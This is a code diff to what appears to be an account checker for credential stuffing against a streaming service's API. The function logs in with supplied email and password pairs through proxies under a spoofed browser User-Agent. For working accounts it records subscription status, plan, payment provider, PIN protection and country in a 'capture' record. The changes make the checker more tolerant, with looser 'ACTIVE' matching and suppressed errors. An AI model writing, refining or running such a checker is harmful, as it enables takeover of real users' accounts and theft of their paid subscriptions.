@@ -43,15 +43,19 @@ def _check_sync(
         "x-api-key": _API_KEY,
         "x-app-var": _APP_VAR,
         "app": "dice",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        "User-Agent": (
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+            "AppleWebKit/537.36 (KHTML, like Gecko) "
+            "Chrome/132.0.0.0 Safari/537.36"
+        ),
     }
 
     try:
         # 1. LOGIN
-        login_payload = {"id": email, "secret": password}
         r1 = session.post(
             "https://dce-frontoffice.imggaming.com/api/v2/login",
-            json=login_payload, headers=headers, proxies=proxy, timeout=15,
+            json={"id": email, "secret": password},
+            headers=headers, proxies=proxy, timeout=15,
         )
 
         if "authorisationToken" not in r1.text:
@@ -61,42 +65,65 @@ def _check_sync(
         headers["Authorization"] = f"Bearer {token}"
 
         # 2. SUBSCRIPTION CHECK
+        # Case-insensitive + whitespace-normalized check (SVB style)
         r2 = session.get(
             "https://dce-frontoffice.imggaming.com/api/v2/licence-family"
             "?includeEntitlements=ALL_ACTIVE_USER_ENTITLEMENTS",
-            headers=headers, proxies=proxy, timeout=10,
+            headers=headers, proxies=proxy, timeout=12,
         )
 
-        if 'status":"ACTIVE' in r2.text:
+        r2_upper = r2.text.upper()
+        is_active = (
+            '"STATUS":"ACTIVE"' in r2_upper.replace(" ", "")
+            or "ACTIVE" in r2_upper
+        )
+
+        if is_active:
             data = r2.json()
-            family = data.get("licenceFamilies", [{}])[0]
-            ent = family.get("entitlements", [{}])[0]
 
-            v_type = ent.get("type", "STANDARD")
-            v_name = ent.get("name", "MONTHLY")
-            auto_renew = family.get("autoRenewingStatus") == "AUTO_RENEWING"
+            # Default capture values
+            v_type = "STANDARD"
+            v_name = "MONTHLY"
+            auto_renew = False
+            pay_method = "STRIPE"
+            pin_protected = False
+            country = "United States 🇺🇸"
 
-            raw_pay = family.get("paymentProviderInfo", {}).get("type", "STRIPE")
-            if raw_pay == "APPLE_IAP":
-                pay_method = "App Store"
-            elif raw_pay == "GOOGLE_IAP":
-                pay_method = "Play Store"
-            else:
-                pay_method = "STRIPE"
+            # Pull detailed info if available
+            try:
+                families = data.get("licenceFamilies", [])
+                if families:
+                    fam = families[0]
+                    ent = fam.get("entitlements", [{}])[0]
+                    v_type = ent.get("type", v_type)
+                    v_name = ent.get("name", v_name)
+                    auto_renew = fam.get("autoRenewingStatus") == "AUTO_RENEWING"
+                    raw_pay = fam.get("paymentProviderInfo", {}).get("type", "STRIPE")
+                    if raw_pay == "APPLE_IAP":
+                        pay_method = "App Store"
+                    elif raw_pay == "GOOGLE_IAP":
+                        pay_method = "Play Store"
+                    else:
+                        pay_method = "STRIPE"
+            except Exception:
+                pass
 
             # 3. PROFILE & COUNTRY
-            r_prof = session.get(
-                "https://dce-frontoffice.imggaming.com/api/v1/profile",
-                headers=headers, proxies=proxy, timeout=10,
-            ).json()
-            pin_protected = r_prof.get("pinProtection") == "PROTECTED"
+            try:
+                r_prof = session.get(
+                    "https://dce-frontoffice.imggaming.com/api/v1/profile",
+                    headers=headers, proxies=proxy, timeout=10,
+                ).json()
+                pin_protected = r_prof.get("pinProtection") == "PROTECTED"
 
-            r_addr = session.get(
-                "https://dce-frontoffice.imggaming.com/api/v2/user/address",
-                headers=headers, proxies=proxy, timeout=10,
-            ).json()
-            cc = r_addr.get("countryCode", "US")
-            country = "United States 🇺🇸" if cc == "US" else cc
+                r_addr = session.get(
+                    "https://dce-frontoffice.imggaming.com/api/v2/user/address",
+                    headers=headers, proxies=proxy, timeout=10,
+                ).json()
+                cc = r_addr.get("countryCode", "US")
+                country = "United States 🇺🇸" if cc == "US" else cc
+            except Exception:
+                pass
 
             return {
                 "email": email,
@@ -109,7 +136,7 @@ def _check_sync(
                 "country": country,
             }
         else:
-            # Valid login but no active subscription → free account.
+            # Logged in but no ACTIVE keyword found → free account.
             return {"email": email, "password": password, "free": True}
 
     except Exception as exc:
